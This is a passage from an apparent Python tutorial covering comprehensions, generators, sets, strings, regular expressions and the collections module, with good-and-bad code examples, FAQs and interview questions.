unique_lengths = {len(word) for word in words}
# {5, 6} (5 for 'apple', 6 for 'banana' and 'orange')

# ✅ GOOD: Remove duplicates from list
numbers = [1, 2, 2, 3, 3, 3, 4]
unique = {n for n in numbers}
# Or simply: unique = set(numbers)
```

#### Generator Expressions

Generator expressions are like list comprehensions but create iterators:

```python
# List comprehension: Creates entire list in memory
squares_list = [x**2 for x in range(1000000)]  # Uses lots of memory

# Generator expression: Creates iterator (lazy evaluation)
squares_gen = (x**2 for x in range(1000000))  # Uses minimal memory

# Usage
for square in squares_gen:
    print(square)  # Computed on-the-fly

# ✅ GOOD: Use generators for large datasets
# Process large file
lines = (line.strip() for line in open('large_file.txt'))
filtered = (line for line in lines if line.startswith('ERROR'))
for line in filtered:
    process_error(line)

# ✅ GOOD: Generator for sum (memory efficient)
total = sum(x**2 for x in range(1000000))  # No list created

# ❌ BAD: Creating list unnecessarily
total = sum([x**2 for x in range(1000000)])  # Creates list first

# Generator expressions can be consumed only once
gen = (x for x in range(5))
list(gen)  # [0, 1, 2, 3, 4]
list(gen)  # [] (generator exhausted)

# ✅ GOOD: Convert to list if you need multiple passes
data = list(x for x in range(5))
list(data)  # [0, 1, 2, 3, 4]
list(data)  # [0, 1, 2, 3, 4] (list can be reused)
```

#### Nested Comprehensions

```python
# Nested list comprehension
matrix = [[i * j for j in range(3)] for i in range(3)]
# [[0, 0, 0], [0, 1, 2], [0, 2, 4]]

# Equivalent nested loops:
matrix = []
for i in range(3):
    row = []
    for j in range(3):
        row.append(i * j)
    matrix.append(row)

# Transpose matrix
matrix = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]
transposed = [[row[i] for row in matrix] for i in range(len(matrix[0]))]
# [[1, 4, 7], [2, 5, 8], [3, 6, 9]]

# Or use zip (cleaner)
transposed = list(map(list, zip(*matrix)))

# ❌ BAD: Too many levels of nesting
result = [[[f(i, j, k) for k in range(3)] for j in range(3)] for i in range(3)]
# Hard to read!

# ✅ GOOD: Use nested loops for complex operations
result = []
for i in range(3):
    level2 = []
    for j in range(3):
        level3 = []
        for k in range(3):
            level3.append(f(i, j, k))
        level2.append(level3)
    result.append(level2)
```

#### Conditional Comprehensions

```python
# if at the end (filter)
evens = [x for x in range(10) if x % 2 == 0]

# if-else before for (transformation)
labels = ["Even" if x % 2 == 0 else "Odd" for x in range(10)]

# Multiple conditions
filtered = [x for x in range(100) if x % 2 == 0 if x % 5 == 0]
# Same as: if x % 2 == 0 and x % 5 == 0

# Complex conditions
result = [
    x for x in data
    if x.is_valid()
    if x.timestamp > cutoff_date
    if x.category in allowed_categories
]

# if-elif-else pattern (use nested ternary)
def categorize(x):
    if x < 0:
        return "negative"
    elif x == 0:
        return "zero"
    else:
        return "positive"

categories = [categorize(x) for x in numbers]

# ⚠️ CAUTION: Nested ternary is hard to read
categories = [
    "negative" if x < 0 else "zero" if x == 0 else "positive"
    for x in numbers
]
```

#### Performance Implications

```python
import timeit

# List comprehension vs for loop
def with_for_loop():
    result = []
    for i in range(1000):
        result.append(i * 2)
    return result

def with_comprehension():
    return [i * 2 for i in range(1000)]

# Comprehension is typically 20-30% faster
timeit.timeit(with_for_loop, number=10000)  # ~0.5 seconds
timeit.timeit(with_comprehension, number=10000)  # ~0.35 seconds

# Generator expression vs list comprehension
def sum_with_list():
    return sum([x**2 for x in range(1000000)])

def sum_with_generator():
    return sum(x**2 for x in range(1000000))

# Generator is more memory-efficient and often faster
timeit.timeit(sum_with_list, number=10)
timeit.timeit(sum_with_generator, number=10)  # Faster and less memory

# ✅ GOOD: Use comprehensions for simple transformations
# - More readable
# - Faster than equivalent loops
# - More Pythonic

# ✅ GOOD: Use generators for large datasets
# - Memory efficient
# - Can process infinite sequences

# ❌ BAD: Comprehensions with side effects
# Don't use comprehensions for side effects
[print(x) for x in range(10)]  # Works but wrong!

# ✅ GOOD: Use regular loop for side effects
for x in range(10):
    print(x)
```

### Frequently Asked Questions

**Q1: When should I use list comprehension vs map/filter?**

**A:** Both are valid, but comprehensions are generally preferred in Python for readability:

```python
# map() - functional style
squares = list(map(lambda x: x**2, range(10)))

# List comprehension - Pythonic
squares = [x**2 for x in range(10)]

# filter() - functional style
evens = list(filter(lambda x: x % 2 == 0, range(10)))

# List comprehension - Pythonic
evens = [x for x in range(10) if x % 2 == 0]

# ✅ GOOD: Use comprehensions for simple cases
result = [x * 2 for x in numbers]

# ✅ GOOD: Use map/filter with existing functions
def complex_transform(x):
    # ... complex logic
    return result

transformed = list(map(complex_transform, numbers))

# ✅ GOOD: map/filter in functional pipelines
from functools import reduce
result = reduce(
    lambda acc, x: acc + x,
    filter(lambda x: x > 0,
           map(lambda x: x * 2, numbers)),
    0
)

# ✅ BETTER: Comprehension is more readable
result = sum(x * 2 for x in numbers if x > 0)
```

**Why This Matters:** Code readability is crucial for maintenance. Python's comprehensions are more readable than functional alternatives.

**Related Concepts:** Functional programming (Section 2.4), Generators (Section 2.3)

---

**Q2: What's the difference between a list comprehension and a generator expression?**

**A:**

```python
# List comprehension - creates entire list in memory
list_comp = [x**2 for x in range(1000000)]
# Memory: ~8MB (1 million integers × 8 bytes)

# Generator expression - creates iterator
gen_exp = (x**2 for x in range(1000000))
# Memory: ~200 bytes (just the generator object)

# ✅ GOOD: Use list comprehension when you need:
# 1. Multiple passes over data
numbers = [x for x in range(100)]
print(sum(numbers))  # First pass
print(max(numbers))  # Second pass - still works

# 2. Random access
numbers = [x for x in range(100)]
print(numbers[50])  # Can access by index

# 3. Length
numbers = [x for x in range(100)]
print(len(numbers))  # Works

# ✅ GOOD: Use generator when you need:
# 1. Single pass over data
total = sum(x**2 for x in range(1000000))

# 2. Infinite sequences
def infinite_numbers():
    n = 0
    while True:
        yield n
        n += 1

# Can't do this with list comprehension!
gen = (x**2 for x in infinite_numbers())

# 3. Memory efficiency for large datasets
# Process 100GB file without loading all into memory
for line in (process(line) for line in open('huge_file.txt')):
    handle(line)

# ⚠️ CAUTION: Generator consumed only once
gen = (x for x in range(5))
list(gen)  # [0, 1, 2, 3, 4]
list(gen)  # [] - exhausted!
```

**Why This Matters:** Memory efficiency is critical when working with large datasets. Using generators can mean the difference between running out of memory and processing terabytes of data.

---

**Q3: Can I modify a list while iterating over it?**

**A:** Generally no, but there are safe ways to handle this:

```python
# ❌ BAD: Modifying list while iterating
items = [1, 2, 3, 4, 5]
for item in items:
    if item % 2 == 0:
        items.remove(item)  # Skips elements!

print(items)  # [1, 3, 5] - Correct by accident
# But try: [1, 2, 2, 3, 4] - removes only first 2

# Why it fails:
items = [1, 2, 2, 3]
#        ^
# Remove 2, list becomes [1, 2, 3]
#           ^ Iterator moves forward, skips second 2!

# ✅ GOOD: Iterate over a copy
items = [1, 2, 3, 4, 5]
for item in items[:]:  # Slice creates copy
    if item % 2 == 0:
        items.remove(item)

# ✅ BETTER: List comprehension (create new list)
items = [1, 2, 3, 4, 5]
items = [item for item in items if item % 2 != 0]

# ✅ BETTER: Filter function
items = [1, 2, 3, 4, 5]
items = list(filter(lambda x: x % 2 != 0, items))

# ✅ GOOD: Modify by index (backwards iteration)
items = [1, 2, 3, 4, 5]
for i in range(len(items) - 1, -1, -1):  # Reverse iteration
    if items[i] % 2 == 0:
        del items[i]  # Safe because we're going backwards

# For removing during iteration (use list() to collect indices first):
items = [1, 2, 3, 4, 5]
to_remove = [i for i, item in enumerate(items) if item % 2 == 0]
for i in reversed(to_remove):  # Remove from end to start
    del items[i]
```

**Why This Matters:** Modifying a collection during iteration is a common source of bugs. Understanding the safe patterns prevents subtle errors.

**Related Concepts:** List operations (Section 1.4), Iterators (Section 2.3)

---

### Interview Questions

**Question 1: What's the output of this code and why?**

```python
matrix = [[0] * 3] * 3
matrix[0][0] = 1
print(matrix)
```

**Difficulty:** Junior

**SDLC Relevance:** Development

**Answer:**

```python
# Output: [[1, 0, 0], [1, 0, 0], [1, 0, 0]]
# NOT: [[1, 0, 0], [0, 0, 0], [0, 0, 0]]

# Why:
# [0] * 3 creates [0, 0, 0]
# [[0] * 3] * 3 creates [ref, ref, ref] where ref is the SAME list
# All three rows point to the same list object!

# Visualization:
row = [0, 0, 0]
matrix = [row, row, row]  # Same reference three times
matrix[0][0] = 1  # Modifies the shared row
# All rows show the change because they're the same object

# ✅ GOOD: Create independent lists
matrix = [[0] * 3 for _ in range(3)]
# Or:
matrix = [[0 for _ in range(3)] for _ in range(3)]

matrix[0][0] = 1
print(matrix)  # [[1, 0, 0], [0, 0, 0], [0, 0, 0]]

# Verify with id():
matrix1 = [[0] * 3] * 3
print(id(matrix1[0]) == id(matrix1[1]))  # True (same object)

matrix2 = [[0] * 3 for _ in range(3)]
print(id(matrix2[0]) == id(matrix2[1]))  # False (different objects)
```

**Key Points to Mention:**

- `*` operator on lists creates references, not copies
- List comprehension creates new objects in each iteration
- Mutable default arguments have similar issues
- Use `id()` to check object identity

**Why This Matters:** This is one of Python's most common gotchas, especially for beginners. Understanding object references vs. values is fundamental.

**Follow-up Questions:**

- What about `[1, 2, 3] * 2`? (Works fine for immutable elements)
- How would you create a deep copy of nested lists? (Use `copy.deepcopy()`)

**Common Mistakes:**

- Using `*` to create multi-dimensional lists
- Not understanding reference vs. value semantics

---

**Question 2: Explain the difference between these two comprehensions:**

```python
# Version 1
result = [x for x in range(10) if x % 2 == 0 if x % 3 == 0]

# Version 2  
result = [x for x in range(10) if x % 2 == 0 and x % 3 == 0]
```

**Difficulty:** Junior

**SDLC Relevance:** Development

**Answer:**

Both produce the same result `[0, 6]`, but have subtle differences:

```python
# Version 1: Multiple if clauses
result = [x for x in range(10) if x % 2 == 0 if x % 3 == 0]
# Reads as: "for x in range(10), if x % 2 == 0, if x % 3 == 0"

# Version 2: Single if with and
result = [x for x in range(10) if x % 2 == 0 and x % 3 == 0]
# Reads as: "for x in range(10), if (x % 2 == 0 and x % 3 == 0)"

# Equivalent to:
result = []
for x in range(10):
    if x % 2 == 0:
        if x % 3 == 0:  # Nested if for version 1
            result.append(x)

result = []
for x in range(10):
    if x % 2 == 0 and x % 3 == 0:  # Single if for version 2
        result.append(x)

# Performance: Nearly identical (and might be slightly faster)
# Readability: Version 2 is clearer for AND conditions

# ✅ GOOD: Use 'and' for related conditions
numbers = [x for x in range(100) if x > 10 and x < 50]

# ✅ GOOD: Multiple ifs for different filtering stages (rare)
result = [
    x for x in data
    if x.is_valid()  # First filter
    if x.category == 'active'  # Second filter (different concern)
    if x.score > threshold  # Third filter
]

# But usually better with 'and':
result = [
    x for x in data
    if x.is_valid() and x.category == 'active' and x.score > threshold
]
```

**Key Points to Mention:**

- Multiple `if` clauses are equivalent to `and`
- Single `if` with `and` is more readable
- Both have similar performance
- Multiple `if` can be useful for complex filtering with different concerns

**Why This Matters:** Code readability affects maintainability. Understanding equivalent forms helps write cleaner code.

---

### Key Takeaways

**Python Syntax & Basic Constructs:**

- **Dynamic typing** offers flexibility but requires discipline with type consistency
- **Operator precedence** matters; use parentheses for clarity
- **Truthiness** is powerful but be explicit when `0`, `""`, or `[]` are valid values
- **Identity (`is`) vs equality (`==`)**: Use `is` only for `None`, `True`, `False`
- **for loops** are Pythonic; use `while` only when iteration count is unknown
- **Loop else clauses** exist but often confusing; consider function returns instead
- **List comprehensions** are faster and more readable than equivalent loops
- **Generator expressions** save memory; use for large datasets and single-pass iteration
- **Avoid modifying** collections during iteration; iterate over copies or use comprehensions
- **Pattern matching (match/case)** in Python 3.10+ provides elegant multi-case handling

---

**(Continuing with Section 1.4 - Data Structures...)**

## 1.4 Data Structures

### Sets

Sets are unordered collections of unique elements:

```python
# Set creation
empty = set()  # NOT {}, which creates empty dict
numbers = {1, 2, 3, 4, 5}
mixed = {1, "hello", 3.14, True}

# Set constructor
from_list = set([1, 2, 2, 3, 3, 3])  # {1, 2, 3} - duplicates removed
from_string = set("hello")  # {'h', 'e', 'l', 'o'}
```

#### Set Operations

```python
a = {1, 2, 3, 4, 5}
b = {4, 5, 6, 7, 8}

# Union (elements in either set)
union1 = a | b  # {1, 2, 3, 4, 5, 6, 7, 8}
union2 = a.union(b)  # Same

# Intersection (elements in both sets)
intersection1 = a & b  # {4, 5}
intersection2 = a.intersection(b)  # Same

# Difference (elements in a but not in b)
difference1 = a - b  # {1, 2, 3}
difference2 = a.difference(b)  # Same

# Symmetric difference (elements in either but not both)
sym_diff1 = a ^ b  # {1, 2, 3, 6, 7, 8}
sym_diff2 = a.symmetric_difference(b)  # Same

# Subset and superset
c = {2, 3}
print(c < a)  # True (c is proper subset of a)
print(c <= a)  # True (c is subset of a)
print(a > c)  # True (a is proper superset of c)
print(a >= c)  # True (a is superset of c)

# Disjoint (no common elements)
d = {10, 11, 12}
print(a.isdisjoint(d))  # True
```

#### Set Methods

```python
s = {1, 2, 3}

# Add element
s.add(4)  # {1, 2, 3, 4}
s.add(4)  # {1, 2, 3, 4} - no duplicates

# Update (add multiple)
s.update([5, 6, 7])  # {1, 2, 3, 4, 5, 6, 7}
s.update({8, 9}, [10])  # Can take multiple iterables

# Remove (raises KeyError if not found)
s.remove(9)  # {1, 2, 3, 4, 5, 6, 7, 8, 10}
try:
    s.remove(100)  # KeyError
except KeyError:
    print("Element not in set")

# Discard (no error if not found)
s.discard(8)  # Removes 8
s.discard(100)  # No error, does nothing

# Pop (remove and return arbitrary element)
element = s.pop()  # Returns and removes some element

# Clear
s.clear()  # set()

# Copy
original = {1, 2, 3}
copy = original.copy()
```

#### frozenset

```python
# Immutable set
fs = frozenset([1, 2, 3, 4, 5])

# Can't modify
try:
    fs.add(6)  # AttributeError
except AttributeError:
    print("frozenset is immutable")

# ✅ GOOD: Use as dictionary key (hashable)
d = {
    frozenset([1, 2, 3]): "set1",
    frozenset([4, 5, 6]): "set2",
}

# ✅ GOOD: Elements of a set
s = {frozenset([1, 2]), frozenset([3, 4])}
```

#### Hash-Based Implementation

```python
# Sets use hash tables (like dicts)
# Fast membership testing: O(1)

large_list = list(range(1000000))
large_set = set(range(1000000))

# ❌ SLOW: List membership test
999999 in large_list  # O(n) - scans entire list

# ✅ FAST: Set membership test
999999 in large_set  # O(1) - hash lookup

# Memory overhead: Sets use more memory than lists
import sys
lst = list(range(1000))
st = set(range(1000))
print(sys.getsizeof(lst))  # ~9000 bytes
print(sys.getsizeof(st))  # ~32000 bytes

# Trade-off: Memory for speed
```

#### Use Cases for Sets

```python
# ✅ GOOD: Remove duplicates
numbers = [1, 2, 2, 3, 3, 3, 4, 5, 5]
unique = list(set(numbers))  # [1, 2, 3, 4, 5]

# ✅ GOOD: Membership testing
allowed_users = {'alice', 'bob', 'charlie'}
if username in allowed_users:  # O(1)
    grant_access()

# ✅ GOOD: Finding common elements
list1 = [1, 2, 3, 4, 5]
list2 = [4, 5, 6, 7, 8]
common = set(list1) & set(list2)  # {4, 5}

# ✅ GOOD: Finding unique elements across lists
unique_in_first = set(list1) - set(list2)  # {1, 2, 3}

# ❌ BAD: When order matters
# Sets are unordered
ordered_unique = []
seen = set()
for item in items:
    if item not in seen:
        ordered_unique.append(item)
        seen.add(item)

# Or use dict (maintains insertion order in 3.7+)
ordered_unique = list(dict.fromkeys(items))
```

### Strings

Strings are immutable sequences of Unicode characters:

```python
# String creation
text = "Hello, World!"
multiline = """
This is a
multiline string
"""

# String immutability
s = "hello"
try:
    s[0] = 'H'  # TypeError: str object does not support item assignment
except TypeError:
    print("Strings are immutable!")

# Create new string instead
s = 'H' + s[1:]  # "Hello"
```

#### String Methods

```python
text = "  Hello, World!  "

# Case conversion
upper = text.upper()  # "  HELLO, WORLD!  "
lower = text.lower()  # "  hello, world!  "
title = text.title()  # "  Hello, World!  "
capitalize = text.capitalize()  # "  hello, world!  "
swapcase = text.swapcase()  # "  hELLO, wORLD!  "

# Whitespace handling
stripped = text.strip()  # "Hello, World!" (both ends)
lstripped = text.lstrip()  # "Hello, World!  " (left)
rstripped = text.rstrip()  # "  Hello, World!" (right)

# Searching
index = text.find('World')  # 9 (first occurrence, -1 if not found)
index = text.index('World')  # 9 (raises ValueError if not found)
count = text.count('l')  # 3

# Boolean checks
print("hello".startswith('he'))  # True
print("hello".endswith('lo'))  # True
print("123".isdigit())  # True
print("abc".isalpha())  # True
print("abc123".isalnum())  # True
print("  ".isspace())  # True

# Splitting and joining
words = "apple,banana,orange".split(',')  # ['apple', 'banana', 'orange']
sentence = "Hello World Python".split()  # ['Hello', 'World', 'Python']
lines = "line1\nline2\nline3".splitlines()  # ['line1', 'line2', 'line3']

joined = ','.join(['apple', 'banana', 'orange'])  # "apple,banana,orange"

# Replacement
replaced = "Hello World".replace('World', 'Python')  # "Hello Python"
replaced_limited = "aaa".replace('a', 'b', 2)  # "bba" (max 2 replacements)

# Padding and alignment
centered = "hello".center(11, '-')  # "---hello---"
left_justified = "hello".ljust(10, '-')  # "hello-----"
right_justified = "hello".rjust(10, '-')  # "-----hello"
zero_filled = "42".zfill(5)  # "00042"

# Partitioning
before, sep, after = "user@domain.com".partition('@')
# before="user", sep="@", after="domain.com"

right_before, sep, right_after = "user@domain.com".rpartition('.')
# right_before="user@domain", sep=".", right_after="com"
```

#### String Formatting

```python
name = "Alice"
age = 30

# % formatting (old style, avoid)
message = "Hello, %s. You are %d years old." % (name, age)

# str.format() (older but still used)
message = "Hello, {}. You are {} years old.".format(name, age)
message = "Hello, {0}. You are {1} years old.".format(name, age)  # Positional
message = "Hello, {name}. You are {age} years old.".format(name=name, age=age)  # Named

# ✅ BEST: f-strings (Python 3.6+)
message = f"Hello, {name}. You are {age} years old."

# Expressions in f-strings
result = f"2 + 2 = {2 + 2}"  # "2 + 2 = 4"
result = f"Uppercase: {name.upper()}"  # "Uppercase: ALICE"

# Formatting specifications
pi = 3.14159
formatted = f"Pi: {pi:.2f}"  # "Pi: 3.14" (2 decimal places)
formatted = f"Pi: {pi:10.2f}"  # "Pi:       3.14" (width 10, 2 decimals)
formatted = f"Percentage: {0.85:.1%}"  # "Percentage: 85.0%"

number = 1234567
formatted = f"Formatted: {number:,}"  # "Formatted: 1,234,567"
formatted = f"Hex: {number:#x}"  # "Hex: 0x12d687"
formatted = f"Binary: {number:#b}"  # "Binary: 0b100101101011010000111"

# Alignment
name = "Alice"
formatted = f"|{name:<10}|"  # "|Alice     |" (left)
formatted = f"|{name:>10}|"  # "|     Alice|" (right)
formatted = f"|{name:^10}|"  # "|  Alice   |" (center)

# Date formatting
from datetime import datetime
now = datetime.now()
formatted = f"Current time: {now:%Y-%m-%d %H:%M:%S}"

# ✅ GOOD: Multi-line f-strings
message = (
    f"User: {name}\n"
    f"Age: {age}\n"
    f"Status: Active"
)

# ✅ GOOD: f-string debugging (Python 3.8+)
x = 10
y = 20
print(f"{x=}, {y=}, {x+y=}")  # x=10, y=20, x+y=30
```

#### Regular Expressions

```python
import re

text = "Contact us at support@example.com or sales@example.com"

# Find email addresses
emails = re.findall(r'\b[\w.-]+@[\w.-]+\.\w+\b', text)
# ['support@example.com', 'sales@example.com']

# Search for pattern
match = re.search(r'support@[\w.-]+', text)
if match:
    print(match.group())  # "support@example.com"

# Match from beginning
match = re.match(r'Contact', text)  # Matches
match = re.match(r'support', text)  # None (doesn't start with 'support')

# Replace
cleaned = re.sub(r'\s+', ' ', "Hello    World")  # "Hello World"

# Split
parts = re.split(r'[,;]', "apple,banana;orange")  # ['apple', 'banana', 'orange']

# Compile for reuse
email_pattern = re.compile(r'\b[\w.-]+@[\w.-]+\.\w+\b')
emails1 = email_pattern.findall(text1)
emails2 = email_pattern.findall(text2)

# Groups
phone = "Phone: 555-1234"
match = re.search(r'(\d{3})-(\d{4})', phone)
if match:
    area_code = match.group(1)  # "555"
    number = match.group(2)  # "1234"
    full = match.group(0)  # "555-1234"

# Named groups
match = re.search(r'(?P<area>\d{3})-(?P<number>\d{4})', phone)
if match:
    print(match.group('area'))  # "555"
    print(match.groupdict())  # {'area': '555', 'number': '1234'}
```

#### String Interning

```python
# String interning: Python caches small strings
a = "hello"
b = "hello"
print(a is b)  # True (same object)

# Longer strings or runtime construction
a = "hello world"
b = "hello world"
print(a is b)  # Might be True or False (implementation detail)

# Force interning
import sys
a = sys.intern("very long string that normally wouldn't be interned")
b = sys.intern("very long string that normally wouldn't be interned")
print(a is b)  # True

# ✅ GOOD: Use interning for large number of duplicate strings
# Saves memory in applications with many repeated strings
# Example: Loading data with repeated category names
```

#### Unicode Handling

```python
# Python 3 strings are Unicode by default
text = "Hello, 世界!"  # Mix of ASCII and non-ASCII
print(len(text))  # 10 characters

# Encode to bytes
utf8_bytes = text.encode('utf-8')
print(len(utf8_bytes))  # 15 bytes (世 and 界 take 3 bytes each in UTF-8)

# Decode from bytes
decoded = utf8_bytes.decode('utf-8')
print(decoded)  # "Hello, 世界!"

# Unicode code points
print(ord('A'))  # 65
print(chr(65))  # 'A'
print(ord('世'))  # 19990
print(chr(19990))  # '世'

# Unicode names
import unicodedata
print(unicodedata.name('€'))  # "EURO SIGN"
print(unicodedata.lookup('EURO SIGN'))  # '€'

# Normalization (important for text comparison)
s1 = "café"  # é as single character (U+00E9)
s2 = "café"  # é as e + combining acute (U+0065 U+0301)
print(s1 == s2)  # Might be False!

# Normalize to NFD (decomposed)
import unicodedata
s1_nfd = unicodedata.normalize('NFD', s1)
s2_nfd = unicodedata.normalize('NFD', s2)
print(s1_nfd == s2_nfd)  # True

# Or normalize to NFC (composed)
s1_nfc = unicodedata.normalize('NFC', s1)
s2_nfc = unicodedata.normalize('NFC', s2)
print(s1_nfc == s2_nfc)  # True
```

### Advanced Collections (collections module)

#### deque (Double-Ended Queue)

```python
from collections import deque

# Create deque
dq = deque([1, 2, 3, 4, 5])

# Add to ends (O(1))
dq.append(6)  # Right end: deque([1, 2, 3, 4, 5, 6])
dq.appendleft(0)  # Left end: deque([0, 1, 2, 3, 4, 5, 6])

# Remove from ends (O(1))
right = dq.pop()  # 6
left = dq.popleft()  # 0

# Extend (multiple elements)
dq.extend([7, 8, 9])
dq.extendleft([0, -1, -2])  # Note: adds in reverse

# Rotate
dq = deque([1, 2, 3, 4, 5])
dq.rotate(2)  # deque([4, 5, 1, 2, 3]) (rotate right)
dq.rotate(-2)  # deque([1, 2, 3, 4, 5]) (rotate left)

# Max length (circular buffer)
dq = deque(maxlen=3)
dq.extend([1, 2, 3])  # deque([1, 2, 3])
dq.append(4)  # deque([2, 3, 4]) - oldest element removed

# ✅ GOOD: Use deque for queues
queue = deque()
queue.append(1)  # Enqueue
queue.append(2)
first = queue.popleft()  # Dequeue - O(1)

# ✅ GOOD: Use deque for sliding window
from collections import deque

def moving_average(data, window_size):
    window = deque(maxlen=window_size)
    result = []
    for value in data:
        window.append(value)
        result.append(sum(window) / len(window))
    return result

data = [1, 2, 3, 4, 5, 6, 7, 8]
averages = moving_average(data, 3)
# [1.0, 1.5, 2.0, 3.0, 4.0, 5.0, 6.0, 7.0]
```

#### Counter

```python
from collections import Counter

# Count occurrences
words = ['apple', 'banana', 'apple', 'orange', 'banana', 'apple']
counter = Counter(words)
# Counter({'apple': 3, 'banana': 2, 'orange': 1})

# Access counts
print(counter['apple'])  # 3
print(counter['grape'])  # 0 (missing keys return 0, not KeyError)

# Most common
print(counter.most_common(2))  # [('apple', 3), ('banana', 2)]

# Elements (iterator of elements)
list(counter.elements())  # ['apple', 'apple', 'apple', 'banana', 'banana', 'orange']

# Update
counter.update(['apple', 'grape'])
# Counter({'apple': 4, 'banana': 2, 'orange': 1, 'grape': 1})

# Arithmetic operations
c1 = Counter(['a', 'b', 'c', 'a'])  # Counter({'a': 2, 'b': 1, 'c': 1})
c2 = Counter(['a', 'b', 'd'])  # Counter({'a': 1, 'b': 1, 'd': 1})

# Addition
print(c1 + c2)  # Counter({'a': 3, 'b': 2, 'c': 1, 'd': 1})

# Subtraction (keeps only positive counts)
print(c1 - c2)  # Counter({'a': 1, 'c': 1})

# Intersection (minimum of corresponding counts)
print(c1 & c2)  # Counter({'a': 1, 'b': 1})

# Union (maximum of corresponding counts)
print(c1 | c2)  # Counter({'a': 2, 'b': 1, 'c': 1, 'd': 1})

# ✅ GOOD: Character frequency
text = "hello world"
char_freq = Counter(text)
print(char_freq.most_common(3))  # [('l', 3), ('o', 2), ('h', 1)]

# ✅ GOOD: Word frequency
from collections import Counter
import re

def word_frequency(text):
    words = re.findall(r'\b\w+\b', text.lower())
    return Counter(words)

text = "The quick brown fox jumps over the lazy dog. The dog was very lazy."
freq = word_frequency(text)
print(freq.most_common(3))  # [('the', 3), ('lazy', 2), ('dog', 2)]
```

#### defaultdict

```python
from collections import defaultdict

# Group items
items = [
    ('fruit', 'apple'),
    ('vegetable', 'carrot'),
    ('fruit', 'banana'),
    ('fruit', 'orange'),
    ('vegetable', 'broccoli'),
]

grouped = defaultdict(list)
for category, item in items:
    grouped[category].append(item)

print(dict(grouped))
# {'fruit': ['apple', 'banana', 'orange'], 'vegetable': ['carrot', 'broccoli']}

# Count occurrences
word_count = defaultdict(int)
for word in ['apple', 'banana', 'apple']:
    word_count[word] += 1  # No KeyError on first access

# Nested defaultdict
tree = lambda: defaultdict(tree)
users = tree()
users['alice']['profile']['name'] = 'Alice'
users['alice']['profile']['age'] = 30
users['alice']['posts'] = ['post1', 'post2']

# ✅ GOOD: Graph representation
from collections import defaultdict

graph = defaultdict(list)
graph['A'].append('B')
graph['A'].append('C')
graph['B'].append('D')
# {'A': ['B', 'C'], 'B': ['D']}

# ✅ GOOD: Inverted index
from collections import defaultdict

def build_inverted_index(documents):
    index = defaultdict(set)
    for doc_id, text in enumerate(documents):
        for word in text.lower().split():
            index[word].add(doc_id)
    return index

docs = [
    "The quick brown fox",
    "The lazy dog",
    "The fox and the dog"
]
index = build_inverted_index(docs)
print(index['fox'])  # {0, 2}
print(index['the'])  # {0, 1, 2}
```

#### OrderedDict

```python
from collections import OrderedDict

# Maintain insertion order (Python 3.7+: regular dict does this too)
od = OrderedDict()
od['a'] = 1
od['b'] = 2
od['c'] = 3
print(list(od.keys()))  # ['a', 'b', 'c']

# move_to_end (unique to OrderedDict)
od.move_to_end('a')
print(list(od.keys()))  # ['b', 'c', 'a']

od.move_to_end('c', last=False)  # Move to beginning
print(list(od.keys()))  # ['c', 'b', 'a']

# popitem with LIFO option
od.popitem(last=True)  # Removes 'a' (last)
od.popitem(last=False)  # Removes 'c' (first)

# Equality comparison includes order
od1 = OrderedDict([('a', 1), ('b', 2)])
od2 = OrderedDict([('b', 2), ('a', 1)])
print(od1 == od2)  # False (different order)

# Regular dict (Python 3.7+)
d1 = {'a': 1, 'b': 2}
d2 = {'b': 2, 'a': 1}
print(d1 == d2)  # True (order not considered)

# ✅ GOOD: LRU cache implementation
class LRUCache:
    def __init__(self, capacity):
        self.cache = OrderedDict()
        self.capacity = capacity
  
    def get(self, key):
        if key in self.cache:
            self.cache.move_to_end(key)  # Mark as recently used
            return self.cache[key]
        return None
  
    def put(self, key, value):
        if key in self.cache:
            self.cache.move_to_end(key)
        self.cache[key] = value
        if len(self.cache) > self.capacity:
            self.cache.popitem(last=False)  # Remove least recently used

cache = LRUCache(3)
cache.put('a', 1)
cache.put('b', 2)
cache.put('c', 3)
cache.put('d', 4)  # Removes 'a'
```

#### ChainMap

```python
from collections import ChainMap

# Combine multiple dictionaries
defaults = {'theme': 'light', 'language': 'en', 'font_size': 12}
user_prefs = {'theme': 'dark', 'font_size': 14}

# First dict has priority
config = ChainMap(user_prefs, defaults)
print(config['theme'])  # 'dark' (from user_prefs)
print(config['language'])  # 'en' (from defaults)

# Updates go to first mapping
config['new_setting'] = 'value'
print(user_prefs)  # {'theme': 'dark', 'font_size': 14, 'new_setting': 'value'}
print(defaults)  # {'theme': 'light', 'language': 'en', 'font_size': 12} - unchanged

# Add new context
admin_prefs = {'font_size': 16}
admin_config = config.new_child(admin_prefs)
print(admin_config['font_size'])  # 16 (from admin_prefs)

# ✅ GOOD: Configuration hierarchy
import os
from collections import ChainMap

# Priority: CLI args > Environment > Config file > Defaults
config = ChainMap(
    cli_args,  # Highest priority
    os.environ,  # Environment variables
    load_config_file(),  # Config file
    default_settings  # Lowest priority (fallback)
)

# ✅ GOOD: Nested scope simulation
from collections import ChainMap

class Scope:
    def __init__(self, parent=None):
        self.parent = parent
        self.vars = {}
  
    def get(self, name):
        scope = self
        while scope:
            if name in scope.vars:
                return scope.vars[name]
            scope = scope.parent
        raise NameError(f"{name} not found")
  
    def set(self, name, value):
        self.vars[name] = value

# Better with ChainMap
class Scope:
    def __init__(self, parent=None):
        if parent:
            self.vars = ChainMap({}, parent.vars)
        else:
            self.vars = ChainMap({})
  
    def get(self, name):
        return self.vars[name]
  
    def set(self, name, value):
        self.vars[name] = value
```

#### namedtuple

```python
from collections import namedtuple

# Define named tuple type
Point = namedtuple('Point', ['x', 'y'])

# Create instances
p1 = Point(10, 20)
p2 = Point(x=30, y=40)

# Access by name or index
print(p1.x, p1.y)  # 10 20
print(p1[0], p1[1])  # 10 20

# Immutable
try:
    p1.x = 100  # AttributeError
except AttributeError:
    print("Named tuples are immutable!")

# Methods
print(p1._asdict())  # {'x': 10, 'y': 20}
print(p1._fields)  # ('x', 'y')
p3 = p1._replace(x=100)  # Point(x=100, y=20)

# Create from iterable
coords = [10, 20]
p4 = Point._make(coords)  # Point(x=10, y=20)

# ✅ GOOD: Represent records
User = namedtuple('User', ['id', 'name', 'email'])
users = [
    User(1, 'Alice', 'alice@example.com'),
    User(2, 'Bob', 'bob@example.com'),
]

for user in users:
    print(f"{user.name}: {user.email}")

# ✅ GOOD: Function returns
from collections import namedtuple

Stats = namedtuple('Stats', ['mean', 'median', 'mode'])

def calculate_stats(numbers):
    return Stats(
        mean=sum(numbers) / len(numbers),
        median=sorted(numbers)[len(numbers) // 2],
        mode=max(set(numbers), key=numbers.count)
    )

